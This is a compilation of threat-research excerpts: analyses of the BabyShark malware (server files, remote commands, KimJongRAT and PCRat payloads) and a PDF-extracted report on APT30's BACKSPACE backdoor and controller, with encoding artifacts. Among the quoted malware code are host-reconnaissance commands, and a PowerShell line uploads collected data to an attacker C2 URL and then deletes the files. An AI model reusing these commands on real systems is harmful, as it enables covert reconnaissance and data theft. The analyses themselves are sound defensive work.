value:1\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Excel\\\\Security\\\\VBAWarnings, value:1\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\14.0\\\\WORD\\\\Security\\\\VBAWarnings, value:1\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\15.0\\\\WORD\\\\Security\\\\VBAWarnings, value:1\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\WORD\\\\Security\\\\VBAWarnings, value:1\\nIt then issues a sequence of Windows commands and saves the results in %AppData%\\\\Microsoft\\\\ttmp.log.\\nwhoami\\nhostname\\nipconfig /all\\nnet user\\ndir “%programfiles%”\\ndir “%programfiles% (x86)”\\ndir “%programdata%\\\\Microsoft\\\\Windows\\\\Start Menu”\\ndir “%programdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs”\\ndir “%appdata%\\\\Microsoft\\\\Windows\\\\Recent”\\ntasklist\\nver\\nset\\nreg query “HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Default”\\nThe collected data is encoded using Windows certutil.exe tool, then uploaded to the C2 via a HTTP POST request.\\nretu=wShell.run(“certutil -f -encode “””&ttmp&””” “””&ttmp1&””””,0,true)\\nretu=wShell.run(“powershell.exe (New-Object System.Net.WebClient).UploadFile(‘https://tdalpacafarm.com/files/kr/contents/upload.php’,'”&ttmp1&”‘);del “””&ttmp1&”””;del “””&ttmp&””””,0,true)\\nBabyShark adds the following registry key value to maintain persistence and waits for further commands from the operator.

The threat actor behind it has a clear focus on gathering intelligence related to Northeast Asia’s national security issues. Well-crafted spear phishing emails and decoys suggest that the threat actor is well aware of the targets, and also closely monitors related community events to gather the latest intelligence. While not conclusive, we suspect that the threat actor behind BabyShark is likely connected to the same actor who used the KimJongRAT malware family, and at least shares resources with the threat actor responsible for the STOLEN PENCIL campaign. We also noticed testing indicating the attackers are working on a PE loader for BabyShark. The threat actor may use different methods to deliver BabyShark in the future campaigns.\\nPalo Alto Networks customers are protected from this threat in the following ways:\\nWildFire and Traps detect all the malware supported in this report as malicious.\\nC2 domains used by the attackers are blocked via Threat Prevention.\\nAutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tag:\\nBabyShark\\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.

Since that publication, malicious attacks leveraging BabyShark have continued through March and April 2019. The attackers expanded targeting to the cryptocurrency industry, showing that those behind these attacks also have interests in financial gain.\\nWhile tracking the latest activities of the threat group, Unit 42 researchers were able to collect both the BabyShark malware’s server-side and client-side files, as well as two encoded secondary PE payload files that the malware installs on the victim hosts upon receiving an operator’s command. By analyzing the files, we were able to further understand the overall multi-staging structure of the BabyShark malware and features, such as how it attempts to maintain operational security and supported remote administration commands. Based on our research, it appears the malware author calls the encoded secondary payload “Cowboy” regardless of what malware family is delivered.\\nOur research shows the most recent malicious activities involving BabyShark malware appear to be carried out for two purposes:\\nEspionage on nuclear security and the Korean peninsula’s national security issues\\nFinancial gain with focus on the cryptocurrency industry based on the decoy contents used in the samples, shown in Figure 1. Xcryptocrash is an online cryptocurrency gambling game.\\nFigure 1. Cryptocurrency related BabyShark malicious document decoy\\nWe presume that the BabyShark malware toolset is shared among actors under the same umbrella or the same group has been assigned an additional mission.\\nIn our analysis, we found BabyShark attacks were using KimJongRAT and PCRat as the encoded secondary payload and thus were the “Cowboys”.\\nSuspicious Access Logging\\nBabyShark has a multi-stage infection chain with checks between each stage, as shown in Figure 2, to ensure only targeted hosts are advanced to the next stage before it finally beacons backs to the attacker.\\nFigure 2. BabyShark malware overall structure\\nThis is done by maintaining a list of blacklisted IP addresses and computer names for those who have made suspicious access attempts, such as access with invalid parameters, to the server as a possible technique meant to make analysis harder. The IP addresses and computer names in the blacklist are written in base64 encoded format at BASE_URI/blackip.txt, shown in Figure 3.\\nFigure 3. Blacklisted IP addresses and computer names in blacktip.txt\\nWhen a new access attempt is made with data matching the blacklist, the server will not proceed to the next stage and alerts the operator via a separate log file shown in Figure 4.\\nFigure 4. Suspicious activity log report to operator\\nBabyShark’s C2 server also logs access to its base URI and redirects to http://go.microsoft.com/. The purpose of this is likely to avoid its files being seen due to potential mis-configurations of the hosting web server.\\nif($ff=fopen(“resp_suspect”,”a”))\\n{\\nfwrite($ff, $date . ”\\xa0 ” . $ip . ” suspected access ” . $useragent .”\\\\r\\\\n”);\\nfclose($ff);\\n}\\nheader(‘Location: http://go.microsoft.com/’);\\nexit;\\nRemote Commands\\nThe operator can issue VBS and PowerShell based commands to victim systems infected with BabyShark. The remote commands we found from the C2 are in the below table, but BabyShark is not limited to these as the attacker can create more VBS or PowerShell command files.\\nVBS based remote commands:\\nCommand Name\\nDescription\\ngetfiles\\nArchive all files in the BabyShark base path as a ZIP archive, then upload to the C2\\nexe_down\\nDownload files for secondary payload:\\n– a Cowboy, a custom encoded PE payload\\n– an EXE type loader which decodes and loads Cowboy in memory\\n– a DLL type loader which decodes and loads Cowboy in memory\\nredirect_vbs\\nPurpose of this command is not clear as key file is missing, but it is likely for changing C2 path\\nTable 1. VBS based remote commands for BabyShark\\nPowerShell based remote administration commands:\\nCommand Name\\nDescription\\nkeyhook\\nTwo types of key loggers implemented using PowerShell and C#\\n– PowerShell based key logger which is openly available on GitHub.

The commands issued to collect host information include:\\n– whoami\\n– hostname\\n– ipconfig\\n– net user\\n– arp -a\\n– dir “%appdata%\\\\Microsoft”\\n– dir “%systemroot%\\\\SysWOW64\\\\WindowsPowerShell\\\\”\\n– vol c: d: e: f: g: h: i: j: k: l: m: n: o: p: q: r: s: t: u: v: w: x: y: z:\\n– dir “%userprofile%\\\\Downloads”\\n– dir “%userprofile%\\\\Documents”\\n– dir “%userprofile%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default”\\n– tasklist\\nAlso, a test result for UAC accessibility, and Microsoft Office security setting from registry key values\\npower com\\nCopy %APPDATA%\\\\Microsoft\\\\delemd.tmp0 to %APPDATA%\\\\Microsoft\\\\XXYYZZ.tmp, and load as DLL\\nexe del\\nClean up all files associated with secondary payload execution.\\n– %APPDATA%\\\\Microsoft\\\\desktop.r3u, encoded Cowboy payload\\n– %APPDATA%\\\\Microsoft\\\\fstnur, file used to check for first time execution\\n– %APPDATA%\\\\Microsoft\\\\*.tmp\\nexecute\\nCopy %APPDATA%\\\\Microsoft\\\\deleme.tmp0 to %APPDATA%\\\\Microsoft\\\\deleme.tmp, and execute it\\nTable 2. PowerShell based remote commands for BabyShark\\nKimJongRAT and PCRat are the Cowboys!\\nThe secondary malware is delivered as a set:\\none EXE loader\\none DLL loader\\none encoded payload\\nThe functionality of the EXE and DLL loaders is the same: the only difference is the file type. These loaders are later run upon receiving an execution command: “execute” to invoke the EXE type loader or “power com” to launch the DLL type loader. We theorize the reason for having two different type loaders is to have redundancy for loading the payload in case of anti-virus software’s disruption. Either loader will load the custom encoded secondary payload, the Cowboy, in memory, decode it, and execute it.\\nIn our previous research, we wrote about possible links between BabyShark and the KimJongRAT malware family. We based these possible links on the similarity of malware behavior, similar interests in the targets, and a freshly compiled KimJongRAT malware sample being seen from the same threat actor. In our latest analysis, we collected two secondary payload files, cow_pass.gif and cow.gif, from BabyShark’s C2 server. After decoding, we found these samples were KimJongRAT and PCRat respectively. Their metadata are in Tables 3 and 4.\\nSHA256\\nf86d05c1d7853c06fc5561f8df19b53506b724a83bb29c69b39f004a0f7f82d8\\ntimestamp\\n2010-07-14 08:47:40\\nsize\\n124,928\\nImport hash\\nd742aa65c4880f85ae43feebb0781b67\\nC2\\n173.248.170.149:80\\nTable 3.

The malware is a variant of the Gh0st RAT malware family and it shares many similarities with Gh0st including its network beacon structure as shown in the Figure 5.\\nFigure 5. PCRat communication with the C2 at 173.248.170.149:80\\nInitially, we were curious about the sample’s old timestamp and it being hardly modified from the original PCRat binary which had been publicly available for many years. However, the operator seemed to be actively operating the malware when we observed the communication between it and the C2 server at the time of our analysis.\\nThe decoded KimJongRAT sample seems to exhibit a few changes in the code from the variants reported in the past. This sample added a substitution cipher to obfuscate API strings, as shown in Figure 5, to hide its intentions and removed its networking feature for C2 data exfiltration, possibly in favor of the password gathering discussed below.\\nFigure 6. Encrypted API strings in KimJongRAT\\nAs the original filename “cow_pass.fig” suggests, KimJongRAT seems to be wholly used as a password extraction and information stealer tool by the threat actor, and the collected data are exfiltrated to C2 with support from other malware such as BabyShark or PCRat. The information that the KimJongRAT malware steals from victim machines include email credentials from Microsoft Outlook and Mozilla Thunderbird, login credentials for Google, Facebook, and Yahoo accounts from browsers Internet Explorer, Chrome, Mozilla Firefox, and Yandex Browser. All this information together with the victims machines’ OS version are stored into the file “%APPDATA%\\\\Microsoft\\\\ttmp.log”. The contents in “ttmp.log” always begin with the string “AAAAFFFF0000CCCC” and then appended with base64 encoded stolen credentials.\\nCVE-2018-8174\\nWe have not observed an in-the-wild case yet, but we did find a PHP sample exploiting CVE-2018-8174 (Windows VBScript Engine Remote Code Execution Vulnerability) on the BabyShark C2 server, and this suggests that the threat actor may be leveraging this vulnerability to make a target load BabyShark’s first stage HTA via a watering hole attack or a malicious URL in a spearphishing email.\\nThe attacker’s exploit script logs the victim’s remote IP address and redirects to http://google.com if the access is made more than one time from the same IP. This again is perhaps a tactic meant to thwart researchers.\\nif(file_exists($filename))\\n{\\nif($ff=fopen(“resp”,”a”))\\n{\\nfwrite($ff, $date . ”\\xa0 ” . $ip .\\xa0 ”\\xa0\\xa0\\xa0 “.$useragent.”\\xa0 \\xa0 \\xa0reopen document.” .”\\\\r\\\\n”);\\nfclose($ff);\\n}\\nheader(“location: http://google.com”);\\nexit;\\n}\\nif($ff=fopen(“resp”,”a”))\\n{\\nfwrite($ff, $date . ”\\xa0 ” . $ip .\\xa0 ”\\xa0\\xa0\\xa0 “.$useragent.”\\xa0 \\xa0 \\xa0 \\xa0 \\xa0 \\xa0 open document.” .”\\\\r\\\\n”);\\nfclose($ff);\\n}\\nCowboy Converter\\nDuring our research, we discovered a Graphical User Interface (GUI)\\xa0 based program likely created by the BabyShark malware author from a public malware repository. The file is to use as a file encoder tool to convert a PE file into a payload format loadable by the previously described Cowboy EXE and DLL loaders. We believe this tool is used by the BabyShark author to create their attack. Its metadata is in Table 5, below.\\nSHA256\\nbd6efb16527b025a5fd256bb357a91b4ff92aff599105252e50b87f1335db9e1\\ntimestamp\\n2019-01-30 18:22:51\\nsize\\n24,576\\nImport hash\\nbde663d08d4e2e17940d890ccf2e6e74\\nTable 5.

If a file with the name of “cowboy” is not found, it pops up a message box notifying “The file cowboy isn’t there!” shown in Figure 7.\\nFigure 7. Cowboy converter and cowboy file not found pop up message\\nThe encoding is done via the following three steps:\\nReverse the original byte content read from the file with the name of “cowboy”\\nTake the reversed bytes and Base64 encode them\\nTake the base64 encoded string and chop it into 10 blocks and reverse the blocks’ order\\nWe have written a decoder script in Python and it is available in the appendix section of this blog.\\nConclusion\\nSince releasing our previous research, malicious attacks leveraging the BabyShark malware have continued. In fact, they have widened their operation to target the cryptocurrency industry. The malware’s server-side implementation showed that the malware author has made certain efforts to maintain the operational security for operating the malware and C2 infrastructures. The threat actor leverages other commodity and custom developed tools in their campaigns. In this case, they were PCRat and KimJongRAT, but these may be changed to other malware families in the future. Malicious attacks using the BabyShark malware also seem likely to continue based on our observations and may continue expanding into new industries.\\nPalo Alto Networks customers are protected from this threat in the following ways:\\nWildFire and Traps detect all malware families and vulnerability exploits mentioned in this report as malicious\\nC2 domains used by the threat actors are blocked via Threat Prevention\\nPre and post infection network communications by the BabyShark and PCRat malware families are blocked by our IPS engine\\nCVE-2018-8174 exploit is blocked by our IPS engine\\nAutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tags:\\nBabyShark\\nCowboyLoader\\nCowboyConverter\\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.

The malware revealed a decade-long operation focused on targetsŠgovernment and commercialŠwho hold key political, economic, and military information about the region. This group, who we call APT30, stands out not only for their sustained activity and regional focus, but also for their continued success despite maintaining relatively consistent tools, tactics, and infrastructure since at least 2005. In essence, our analysis of APT30 illuminates how a group can persistently compromise entities across an entire region and subcontinent, unabated, with little to no need to significantly change their modus operandi. Based on our malware research, we are able to assess how the team behind APT30 works: they prioritize their targets, most likely work in shifts in a collaborative environment, and build malware from a coherent development plan. Their missions focus on acquiring sensitive data from a variety of targets, which possibly include classified government networks and other networks inaccessible from a standard Internet connection. While APT30 is certainly not the only group to build functionality to infect air-gapped networks into their operations, they appear to have made this a consideration at the very beginning of their development efforts in 2005, significantly earlier than many other advanced groups we track. Such a sustained, planned development effort, coupled with the group™s regional targets and mission, lead us to believe that this activity is state sponsoredŠmost likely by the Chinese government. Rather than focus on the potential sponsorship of this activity, this report seeks to thoroughly analyze the development effort of one of the longest-running advanced threat groups we™ve observed. APT30 and the Mechanics of a Long-Running Cyber Espionage Operation APT30 is noted for sustained activity, but also for successfully maintaining the same tools, tactics, and infrastructure since at least 2005. 4APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT KEY FINDINGSAPT30™s development and refinement of a set of integrated tools, as well as their re-use of infrastructure over a period of 10 years, suggests a consistent long-term mission. This suite of tools includes downloaders, backdoors, a central controller, and several components designed to infect removable drives and cross air-gapped networks to steal data. APT30 frequently registers their own DNS domains for use with malware command and control (C2). Based on their presence in malware samples, some of the domains have been in use for many years. APT30 has a structured and organized workflow, illustrative of a collaborative team environment , and their malware reflects a coherent development approach. The group (or the developers supporting them) systematically labels and keeps track of their malware versioning. The malware uses mutexes and events to ensure only a single copy is running at any given time, and the malware version information is embedded within the binary. Malware C2 communications include a version check that allows the malware to update itself to the latest copy, providing a continuous update management capability. The controller software for APT30™s BACKSPACe backdoor (also known as ﬁLecnaﬂ) suggests the threat actors prioritize targets and may work on shifts. APT30 backdoors commonly use a two-stage C2 process, where victim hosts contact an initial C2 server to determine whether they should connect to the attackers™ main controller. The controller itself uses a GUI that allows operators to prioritize hosts, add notes to victims, and set alerts for when certain hosts come online. Finally, an unused dialog box in the controller provides a login prompt for the current ﬁattendant.ﬂ The group™s primary goal appears to be sensitive information theft for government espionage . APT30 malware includes the ability to steal information (such as specific file types), including, in some cases, the ability to infect removable drives with the potential to jump air gaps. Some malware includes commands to allow it to be placed in ﬁhideﬂ mode and to remain stealthy on the victim host, presumably for long-term persistence.APT30 predominantly targets entities that may satisfy governmental intelligence collection requirements. The vast majority of APT30™s victims are in Southeast Asia. Much of their social engineering efforts suggest the group is particularly interested in regional political, military, and economic issues, disputed territories, and media organizations and journalists who report on topics pertaining to China and the government™s legitimacy. 10. YEARS1APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT IndiaSouth Korea Malaysia VietnamNepalBhutanPhilippinesSingaporeIndonesiaBruneiMyanmarLaosCambodiaJapanThailand Saudi Arabia United StatesCountries with Confirmed APT 30 Targets Countries with Likely APT30 Targets 5Our analysis of APT30™s malware and domain registration data shows the group has been operating for over a decade. The earliest-known registration dates for domains attributed to APT30 go back to 2004, and the compile times for APT30 malware using those domains for C2 date back to 2005.1Typically, threat groups who register domains for malicious use will abandon them after a few years. APT30, however, has used some of their domains for more than five years, with some of their earliest domains still in use as of at least late 2014. For example, one of the earliest known BACKSPACE malware samples (md5 hash b2138a57f723326eda5a26d2dec56851) was compiled onMarch 11, 2005 at 00:44:47. The sample used the domain www.km-nyc.com as its primary C2 location. That domain was still in use as a secondary C2 domain in a BACKSPACE sample compiled as recently as November 5, 2014 05:57:26 (md5 hash 38a61bbc26af6492fc1957ac9b05e435).For such a long operational history, APT30 appears to have conducted their activity using a surprisingly limited number of tools and backdoors. One reason for this might be that they have had no need to diversify or add to their arsenal if they have been successful with their current approach. Although APT30 has used a variety of secondary or supporting tools over the years (such as droppers and downloaders used to deploy APT30™s primary backdoors), their primary tools have remained remarkably consistent over time: namely, the backdoors BACKSPACE and NETEAGLE, and a set of tools (SHIPSHAPE, SPACESHIP, and FLASHFLOOD) believed to be designed to infect (and steal data from) air-gapped networks via infected removable drives. Where some threat groups might exchange one backdoor for another as newer, more flexible, or more feature-rich tools become available, APT30 has chosen to invest in the long-term refinement and development of what appear to be a dedicated set of tools. This suggests that APT30 (or the developers providing them with tools) has the ability to modify and adapt their source code to suit their current needs or their target environment. The earliest variants of the BACKSPACE backdoor date to at least 2005, and versions of the backdoor remain in use today. BACKSPACE itself appears to have a flexible, modularized development framework and has been modified over time to create a wide range of variants. APT30: In It for the Long Haul km-nyc.comkm153.com11 March 200511 May 2014 COMPILE DATE ŒRECENT SAMPLECOMPILE DATE ŒEARLY SAMPLE 11 May 2014 4 September 2007DOMAIN REGISTRATION DATE DOMAIN11 March 200430 August 2007 6FireEye has identified two main ﬁbranchesﬂ of the BACKSPACE code (ﬁZJﬂ and ﬁZRﬂ), each compiled with a slightly different set of commands. In addition, while BACKSPACE has been implemented in a variety of ways (e.g., as a standalone EXE, as a DLL, as an EXE that extracts and launches a DLL at runtime) and leveraged a variety of persistence methods (e.g., via a shortcut (.lnk) file in the Startup folder, as a service DLL), the core functionality has remained largely unchanged, although some additional features have been added over time. While the NETEAGLE backdoor does not have as venerable a history (identified samples were compiled as early as 2008 and as recently as 2013), it shows a similar pattern of long-term refinement and modification, including the development of two main variants (which we call the ﬁScoutﬂ and ﬁNortonﬂ variants). Just as with BACKSPACE, while the details of implementation and specific features across NETEAGLE samples may vary, the core functionality remains the same except for the addition of features or enhancements.This dedication to adapting and modifying tools over a number of years, as opposed to discarding old tools in favor of newer, readily available ones, implies that APT30 has a long-term mission, and that their mission is consistent enough for their existing tools to be sufficient to support their operations over a long period of time.APT30 appears to have a consistent, long-term mission that relies on existing COMPILE DATE ŒRECENT SAMPLECOMPILE DATE ŒEARLY SAMPLE MALWARE / TOOL BACKSPACE 2 January 20055 November 2014 NETEAGLE 20 June 20086 November 2013 SHIPSHAPE22 August 20069 June 2014SPACESHIP 23 August 20065 June 2014FLASHFLOOD 31 January 200517 February 2009 APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT 7In addition to APT30™s long-term use of a regular set of tools, in most cases the tools themselves Œ while they may vary in purpose Œ share a consistent set of development features. In particular, the tools all exhibit a carefully managed versioning system and a consistent method for checking version information, performing updates, and ensuring only a single copy of a given tool is running on a victim host at any time. This suggests that APT30 is dedicated to maintaining a tightly run, efficient operation. BACKSPACE, NETEAGLE, SHIPSHAPE, and SPACESHIP all maintain an internal version number and include some means to check their version number against a reference version, and attempt to automatically update the malware if its version is different than the reference number. For some APT30 malware, we speculate that the version string may also describe additional properties of the malware. For instance, one variant of BACKSPACE (ﬁZRLnkﬂ) uses a version string where the first two digits indicate the malware version number. The next character may indicate the type of icon stored in the file™s resource section and possibly the type of exploit document used to deliver the malware (for example, ‚p™ for Acrobat Reader / PDF and ‚w™ for Microsoft Word 2). Finally, the next character (‚l™) may indicate that that the malware uses a shortcut (.lnk) file to maintain persistence. 3PROFESSIONALLY DEVELOPING TOOLS: APT30 Uses a Consistently Organized Malware Development Approach Table 1: ZRLnk version history MD5 HashVersion Compile TimeSizeb4ae0004094b37a40978ef06f311a75e1.0.p.l4 November 2010 03:51 73,72837aee58655f5859e60ece6b249107b871.1.w.l 25 February 2011 02:03 32,7688ff473bedbcc77df2c49a91167b1abeb1.2.w.l 4 May 2011 14:46 49,1524154548e1f8e9e7eb39d48a4cd75bcd11.2.w.l 4 May 2011 14:46 17,40815304d20221a26a0e413fba4c57296451.2.w.l 16 May 2011 11:03 36,864c4dec6d69d8035d481e4f2c86f580e811.3.w.l 26 October 2011 11:2140,960a813eba27b2166620bd75029cc1f04b01.3.p.l28 June 2012 10:0186,1445b2b07a86c6982789d1d85a78ebd6c541.5.w.lN 8 January 2013 01:3310,518,52871f25831681c19ea17b2f2a84a41bbfb1.6.w.lY 23 April 2013 08:1257,3446ee35da59f92f71e757d4d5b964ecf001.9.w.lY 28 August 2014 0 9:1257,344 APT30 and the Mechanics of a Long-Running Cyber Espionage Operation SPECIAL REPORT 888With respect to version numbers, the BACKSPACE ﬁZJﬂ variant has the longest revision history. Our analysis of 55 ZJ samples showed versions from 1.2 through 20.50 spanning nearly eight years (from 2005 through 2012, based on compile times).Besides version control, most malware used by APT30 (to include BACKSPACE, SHIPSHAPE, SPACESHIP, and FLASHFLOOD) uses a consistent methodology (a set of mutexes and events) to manage malware execution and ensure that only a single copy of a given piece of malware is running at any one time, presumably to decrease the chances of detection. The mutexes and events are highly consistent in their naming conventions, with most containing the terms ‚Microsoft™ or ‚ZJ™ or both. The mutex is created when the malware executes, and ensures only one copy is running at a time. The events use similar naming conventions as the mutexes, and are used to signal the malware and associated threads to exit. 4The emphasis on malware versioning implies a structured and well-managed development environment. Similarly, the close attention to ensuring only one copy of a given tool is running at a time and a well-developed, automated means of update management imply that these tools are in use by a professional team of threat actors. We can infer that the threat actors are interested in maintaining the latest and greatest versions of their tools in their victims™ environments. Likewise, the threat actors are likely operating at a sufficiently large scale that they benefit from the automated management of many of their tools .While there is no guarantee that the tools described in this paper are exclusive to APT30, we have not yet observed these tools used by any other threat groups. That the tools have evolved over time while maintaining a consistent amount of core functionality indicates that APT30 has development resources available to modify and customize their malware. This implies either that APT30 is responsible for developing their own tools, or has a working relationship with developers able to support them in a consistent (and possibly exclusive) manner.

The BACKSPACE and NETEAGLE backdoors used by APT30 use a two-stage C2 infrastructure. The backdoors are configured with an initial (stage one) set of C2 locations, typically one or more C2 domains. Interaction with the stage one C2 is fully automated; that is, the stage one C2 does not support any interactive communication between the threat actor and the victim computer. Both BACKSPACE and NETEAGLE use HTTP requests to interact with the stage one C2, requesting URIs to download different files that are used to obtain basic instructions, information (including second stage C2 locations) or download and execute additional binaries. While victim hosts may beacon to the second stage C2 (e.g., transmit data about the victim without expectation of a response), only those victim hosts specifically instructed to do so will establish a full connection to a BACKSPACE controller. Once the malware has connected to the controller, the threat actor can interact directly with the victim host. By using this two-stage approach, the threat actors introduce a layer of obfuscation between themselves and their victims. This also allows them to better manage their victims, particularly at scale; newly infected victims can interact with the stage one C2 servers in an automated fashion until the threat actors can review them and select particular hosts for interactive, stage two exploitation. The table below shows an example set of URIs that may be requested by the BACKSPACE sample with md5 hash 6ee35da59f92f71e757d4d5b964ecf00, and the purpose of each file.5 Full URIs are in the format of hxxp://<c2_domain>/<path>/<file>, where <c2_domain> is one of the backdoor™s specified C2 domains; <path> is a path name that typically varies across samples (/some/ or /ForZRLnk3z/ in the examples below); and <file> is the specific file requested.USING TWO-STAGE C2 to Balance Stealth and Scalability 10port 1 port 2Stage Two C2 Server (IP:port1:port2)Stage One C2 Server BACKSPACE Victim Host 2.

FireEye analyzed three copies of the BACKSPACE controller software, known as the ﬁNetEagle Remote Control Systemﬂ 6 (according to the version information from one sample) or (according to the ﬁAboutﬂ dialog box). Although the copies we analyzed were compiled in 2010, 2011, and 2013 respectively, the tool™s descriptions indicate the original controller software may have been developed as early as 2004. 7The BACKSPACE controller is a well-developed, full-featured GUI tool. The controller includes main menu items for ﬁSystemﬂ, ﬁNetworkﬂ, ﬁFileﬂ, ﬁRemoteﬂ, and ﬁAttackﬂ operations, in addition to the ﬁAboutﬂ dialog box. Information about victim hosts connected to the controller is displayed in the lower panes, including the hostname, internal and external IP addresses, system uptime, and OS version and language. Many of APT30™s tools perform version checks and attempt to self-update. Comments:©2004 Microsoft Corporation.

BACKSPACE victim computers will retrieve dizhi.gif and transmit information about the victim computer (via HTTP POST) to the second stage IP address and port specified in that file. This victim information is used to populate the controller GUI (see Figure 4). However, BACKSPACE clients do not establish interactive connections to the BACKSPACE controller by default, as this would increase the risk of exposing the second-stage C2 server. When a threat actor wants to establish remote control over a victim host, he uploads a notification file (e.g., connect.gif) containing the victim hostname and host ID number to the stage one C2 server. Victim hosts will parse the connect.gif file retrieved from the server and connect to the BACKSPACE controller (using the data from dizhi.gif) if their hostname and host ID are present in the file.System Network File Remote Attack AboutLocal Info Computer Name IP Location Refresh Interval (min) Online Capacity Hostname Public IP Private IP Location Up-Time OS Comment Host ID Domain Controller Name Domain Hostname Public IP Private IP Location Up-Time OS/Language Comment Host ID Controller Name 13Both dizhi.gif and connect.gif are generated by the BACKSPACE controller based on user- defined configuration settings and automatically uploaded to the stage one C2 server. This simplifies management of victim computers, reduces the risk of configuration errors, and allows even relatively unskilled operators to manage C2 infrastructure and victim hosts. The screen shot below shows the configuration options for the two files, including the FTP credentials used to connect to the stage one server, the path for the files, the names of the files, and the primary and backup stage one C2 servers. These same configuration settings are used to customize a copy of the BACKSPACE malware, by ﬁpatchingﬂ the relevant bytes within the BACKSPACE binary. Similarly, a second dialogue box allows the threat actor to specify the ports (listed in dizhi.gif) used for communication with the second stage C2 server/BACKSPACE controller. The first port is used to transmit victim data via HTTP POST. The second port is used to establish an interactive connection with the BACKSPACE controller. The third port is used for a reverse command shell between the controller and the victim.Double-clicking an idle victim in the BACKSPACE controller GUI will automatically create (or update) connect.gif with that victim™s hostname and host ID and upload the new file to the stage one C2 server. The next time the victim parses the file, it will establish a connection to the controller. 14BACKSPACE CONTROLLER Œ BACKDOOR COMMUNICATION The BACKSPACE controller uses a modified HTTP protocol to communicate with BACKSPACE clients on victim hosts. Victim hosts send data to the controller in HTTP POST format. When the controller receives the data, it ignores other HTTP headers and only parses the Content-Length value and the body data. No acknowledgement packet is sent back to the backdoor. The BACKSPACE controller sends remote command messages to BACKSPACE clients in the format below, disguised as a response from a Microsoft IIS 6.0 server. Similar to the controller, the BACKSPACE client only parses the Content-Length field and the remote command stored in the body and ignores other HTTP headers.POST /index.htm HTTP/1.0User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)HOST: 192.168.43.130:80Pragma: no-c acheContent-Length: 235Proxy-Connection: Keep-AliveUSER-29861D99F7.192.168.43.133.............(......Service Pack 3..............................................................................................................................N..1.0.p.18:32.www.stonehoof.com/ForZRMail..HTTP/1.1 200 OKServer: Microsoft-IIS6.0Content-Length: 12Content-Type: */*Accept-Ranges: bytesConnection: Keep-AliveB....C:\\\\*.*.TARGET HOST PRIORITIZATION AND ALERTS The BACKSPACE controller allows the threat actors to further manage their victim hosts by labeling individual hosts with a comment, assigning a priority level to the victim (ﬁNormalﬂ, ﬁImportantﬂ, or ﬁVery Importantﬂ), and setting an alert to notify the threat actor when the victim host comes online.APT30 assigns a priority level to their victims: ﬁNormal,ﬂ ﬁImportant,ﬂ and ﬁVery Important.ﬂ 15EXECUTING CUSTOM TASKS The BACKSPACE controller includes a menu item called ﬁAutomatically Execute Custom Taskﬂ (highlighted below) which sends the ‚O™ command supported by some variants of the BACKSPACE backdoor. 8 When the backdoor receives this command, it uploads data to the controller from predefined paths on the victim host ($LDDATA$\\\\ and %WINDIR%\\\\$NtUninstallKB900727$\\\\). This special command appears to be used to retrieve stolen data from the victim computer in an automated fashion (as opposed to manually uploading files or directories). Of note is that these paths are found in other tools used by APT30 (specifically SPACESHIP and FLASHFLOOD) believed to be used to target air- gapped computers and networks.9Below the ﬁAutomatically Execute Custom Taskﬂ menu item is another custom option for ﬁGOTO custom pathﬂ. When selected, that menu item also directs the operator to a predefined custom path (one used by some versions of FLASHFLOOD) by default: VERSION CONTROL AND AUTOMATIC UPDATES Like many of the tools used by APT30, the BACKSPACE controller also performs a version check and attempts to self-update. The controller will transmit the following HTTP requests for a version file ( NetEagleVer.txt) and updated binary (NetEagle.exe) when it starts. GET /NE.General NetEagleVer.txt HTTP/1.1Accept: */*User-Agent: HttpClientHost: www.km153.comGET /NE.General/NetEagle.exe HTTP/1.1Accept: */*User-Agent: HttpClientHost: www.km153.com 16DISK SERIAL NUMBER AUTHENTICATION The BACKSPACE controller also includes a check to ensure that the controller is only run on authorized machines. The controller compares the local host™s hard disk serial number with 45 encoded serial numbers hardcoded within the controller binary, and continues execution only if there is a match. This indicates that the developers of the controller wanted to limit its distribution and use. The developers could have written the controller for themselves; alternately, the controller could have been sold with built-in restrictions so the developers could continue to write and sell custom versions to others. 10 Given the tightly integrated nature of much of APT30™s malware (with each other and with the controller) and the fact that the controllers themselves use APT30 domains to perform self-update checks, it seems more likely that APT30 (or a group of developers closely aligned with them) created the controller for their own use.APT30 POSSIBLY WORKING ON SHIFTS In our analysis of the BACKSPACE controller, we identified a dialog box in the portable executable (PE) resource section. The dialog box included a login prompt with the text , which translates to ﬁPlease enter your attendant codeﬂ. This suggests the tool may have been designed to track work shifts amongst multiple operators, although this particular feature was disabled in the sample we analyzed.The history of the BACKSPACE controller (possibly written as early as 2004, and still compatible with BACKSPACE variants compiled within the past year) reflects a tool developed over time and designed to facilitate detailed interaction with victim hosts through a relatively simple interface. The tool is capable of supporting interaction with a large number of victim hosts, and includes features to allow the operator to filter, prioritize, alert on, and otherwise manage his or her victims, implying operations large enough to warrant such features. The controller exhibits the same diligent version control and self-updating features observed in other malware used by APT30. In addition, the serial number checks built in to the BACKSPACE controller imply a very limited distribution tool designed to be used by only a select number of users. Finally, the ﬁattendantﬂ dialog box implies that the controller itself may have been designed for use in a highly organized environment. All of these factors point to a threat group with long-term, organized, and structured development resources; a need to manage and track a potentially large number of victims over time; and an organized work force responsible for carrying out the group™s objectives. 17APT30™S PRIMARY MISSION:Data Theft for Political Gain Based on our knowledge of APT30\\'s targeting activity and tools, their objective appears to be data theft as opposed to financial gain. APT30 has not been observed to target victims or data that can be readily monetized (for example, credit card data, personally identifiable information, or bank transfer credentials). Instead, their tools include functionality that allows them to identify and steal documents, including what appears to be an interest in documents that may be stored on air-gapped networks.Both the BACKSPACE and NETEAGLE backdoors support a range of command functions that allow the threat actors to manipulate files on the victim host, including reading and writing files, searching for files with specific names or attributes, deleting files, and uploading 